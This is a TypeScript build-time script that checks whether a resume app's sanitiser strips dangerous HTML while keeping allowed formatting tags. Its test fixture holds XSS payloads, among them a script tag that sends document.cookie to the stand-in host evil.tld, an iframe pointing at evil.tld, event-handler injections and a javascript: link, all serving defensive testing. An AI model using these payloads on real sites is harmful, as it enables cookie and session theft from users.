// Build-time proof that the resume save path strips dangerous HTML.
//
// Wired into `prebuild` beside verify-paywall.ts, deliberately. The repo has
// vitest as a dependency but no `test` script and no test files, so a suite
// added here would never run. A check that blocks the build is worth more than
// a suite nobody invokes.
//
// What it asserts, in both directions:
//   1. every dangerous construct is removed by the save-path sanitiser
//   2. every ALLOWED formatting tag survives it — a sanitiser that ate <strong>
//      would "pass" a security test while silently destroying users' CVs
//   3. plain-string fields are left byte-identical, so no double-encoding
//   4. the covered-paths list still matches the RichText fields in cv-types.ts
//
// Run directly: npx tsx scripts/verify-sanitize.ts

import { readFileSync } from "node:fs";
import { sanitizeResumeData, SANITIZED_RICHTEXT_PATHS } from "../src/lib/sanitize-resume";

let failures = 0;
const check = (label: string, ok: boolean, detail = ""): void => {
  if (!ok) failures++;
  console.log(`  ${ok ? "PASS" : "FAIL"}  ${label}${detail ? `  — ${detail}` : ""}`);
};

// ---------------------------------------------------------------- payload ---
const DANGEROUS = {
  basics: {
    fullName: "R&D Engineer <not a tag>",
    role: "Dev",
    email: "t@example.com",
    summary: `<img src=x onerror=alert(1)>Led <strong>three</strong> teams.`,
  },
  experience: [
    {
      company: "Acme",
      role: "Dev",
      startDate: "2020",
      bullets: [
        `<script>fetch('//evil.tld?c='+document.cookie)</script>Cut latency <em>40%</em>.`,
        `<a href="javascript:alert(2)">click me</a>`,
        `<p onclick="steal()">Shipped <u>v2</u>.</p>`,
        `<iframe src="//evil.tld"></iframe>Ran <b>hiring</b>.`,
      ],
    },
  ],
  education: [],
  skills: ["TypeScript & Go"],
  achievements: `<svg onload=alert(3)>Grew revenue <i>3x</i>.`,
};

const out = sanitizeResumeData(DANGEROUS);
const wire = JSON.stringify(out);

// ---------------------------------------------- 1. dangerous constructs gone -
console.log("\n1. dangerous constructs removed from the saved payload");
for (const [name, re] of [
  ["<script>", /<script/i],
  ["on* handler (onerror/onclick/onload)", /\son\w+\s*=/i],
  ["javascript: URL", /javascript:/i],
  ["<img>", /<img/i],
  ["<iframe>", /<iframe/i],
  ["<svg>", /<svg/i],
  ["<a href>", /<a\s/i],
] as const) {
  check(`${name} stripped`, !re.test(wire));
}

// -------------------------------------------- 2. allowed formatting survives -
console.log("\n2. legitimate formatting preserved (the allowlist still works)");
const summary = out.basics.summary;
const bullets = out.experience[0].bullets;
check("<strong> kept in summary", /<strong>three<\/strong>/.test(summary), summary);
check("<em> kept in a bullet", /<em>40%<\/em>/.test(bullets[0]));
check("<u> kept in a bullet", /<u>v2<\/u>/.test(bullets[2]));
check("<p> kept (attributes dropped)", /<p>/.test(bullets[2]) && !/onclick/.test(bullets[2]));
check("<b> kept in a bullet", /<b>hiring<\/b>/.test(bullets[3]));
check("<i> kept in achievements", /<i>3x<\/i>/.test(out.achievements));
check("visible text survives stripping", /Cut latency/.test(bullets[0]));

// The Batch 3 templates type `bullets` as ONE RichText string, not an array,
// and render it through dangerouslySetInnerHTML. Assert that shape is cleaned
// too — otherwise a row written that way walks past the boundary untouched.
const stringBullets = sanitizeResumeData({
  experience: [{ bullets: `<script>alert(1)</script><ul><li>Kept <b>bold</b>.</li></ul>` }],
} as never) as { experience: Array<{ bullets: string }> };
check(
  "bullets-as-string sanitised, not skipped",
  !/<script/i.test(stringBullets.experience[0].bullets) &&
    /<b>bold<\/b>/.test(stringBullets.experience[0].bullets),
  stringBullets.experience[0].bullets,
);

// ------------------------------------------------ 3. plain strings untouched -
console.log("\n3. plain-string fields untouched (no double-encoding)");
check(
  "basics.fullName byte-identical",
  out.basics.fullName === DANGEROUS.basics.fullName,
  JSON.stringify(out.basics.fullName),
);
check("skills byte-identical", out.skills[0] === "TypeScript & Go", out.skills[0]);
check("company byte-identical", out.experience[0].company === "Acme");

// ------------------------------------------------------- 4. coverage is live -
console.log("\n4. covered paths still match the RichText fields in cv-types.ts");
const types = readFileSync(new URL("../src/lib/cv-types.ts", import.meta.url), "utf8");
const declared = (types.match(/^\s*(\w+)\??:\s*RichText(\[\])?;/gm) ?? []).map((l) =>
  l.trim().replace(/\??:.*/, ""),
);
const covered = SANITIZED_RICHTEXT_PATHS.join(" ");
console.log(`     declared RichText fields: ${declared.join(", ") || "(none parsed)"}`);
console.log(`     covered paths           : ${covered}`);
for (const f of declared) {
  check(`"${f}" is covered by the sanitiser`, covered.includes(f));
}

// ------------------------------------------------------------ 5. robustness --
console.log("\n5. malformed input does not throw (this runs on wire data)");
for (const [label, value] of [
  ["null", null],
  ["undefined", undefined],
  ["a string", "nope"],
  ["an array", [1, 2]],
  ["missing basics", { experience: [] }],
  ["bullets not an array", { experience: [{ bullets: "oops" }] }],
  ["entry not an object", { experience: [null, 7] }],
  ["bullets as a single HTML string (Batch 3 shape)", { experience: [{ bullets: "<ul><li>x</li></ul>" }] }],
] as const) {
  let threw = false;
  try {
    sanitizeResumeData(value as never);
  } catch {
    threw = true;
  }
  check(`${label} handled`, !threw);
}

console.log(
  failures === 0
    ? "\n✓ verify-sanitize: the save path strips dangerous HTML and keeps allowed formatting.\n"
    : `\n✗ verify-sanitize: ${failures} assertion(s) failed.\n`,
);
process.exit(failures === 0 ? 0 : 1);
